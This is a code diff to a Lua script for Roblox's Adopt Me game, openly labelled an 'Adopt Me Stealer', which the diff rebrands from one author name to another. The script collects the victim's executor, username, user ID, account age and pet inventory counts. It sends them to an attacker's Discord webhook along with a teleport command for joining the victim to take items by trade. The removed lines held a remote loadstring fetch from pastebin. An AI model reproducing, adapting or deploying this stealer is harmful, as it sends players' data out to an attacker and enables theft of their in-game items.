@@ -1,13 +1,3 @@
-if Username == "" or Username == nil then
-  game:GetService("Players").LocalPlayer:Kick("Enter a username!")
-end
-if Webhook == "" or Webhook == nil then
-  game:GetService("Players").LocalPlayer:Kick("Please enter a webhook!")
-end
-if 
-    game.PrivateServerEnabled then
-      game:GetService("Players").LocalPlayer:Kick("Not supported in VIP servers. Please try in public servers.") 
-end
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
@@ -54,7 +44,7 @@ local function getexploit()
         (isvm and "Proxo") or
         (shadow_env and "Shadow") or
         (jit and "EasyExploits") or
-        (getscriptenvs and "Codex/Unknown") or
+        (getscriptenvs and "Calamari") or
         (unit and not syn and "Unit") or
         (OXYGEN_LOADED and "Oxygen U") or
         (IsElectron and "Electron") or
@@ -67,14 +57,14 @@ local plr = game.Players.LocalPlayer
 local userid = game.Players.LocalPlayer.UserId
 local accage = game.Players.LocalPlayer.AccountAge
 local data = {
-  username = 'Kenn | Adopt Me Stealer!!',
+  username = 'Pethical | Adopt Me Stealer!!',
   avatar_url = 'https://cdn.discordapp.com/attachments/1295330912900223039/1296364145406509056/standard_3.gif?ex=671204b1&is=6710b331&hm=995afe10858ed42f3ab62edd76e9c71de4fbbf8120bb1450c963cceff22483fd&',
-  content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)',
+  content = '@everyone Join your player using **EXECUTE TO JOIN THEM** and they should just trade you to start stealing!',
   embeds = {
     {
-      title = 'Copy the script above, execute it, then you will be teleported to victim!',
-      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n**🎁 Claim All Script**:\n\n```lua\nUsername = "'.. tostring(plr) ..'"\nloadstring(game:HttpGet("https://pastebin.com/raw/GzXc94aX"))()```',
-      color = #DC143C
+      title = 'Pethical | Skidtho 👑',
+      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n```\n**💼 Execute To Join Them**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```',
+      color = 10428396
     }
   }
 }
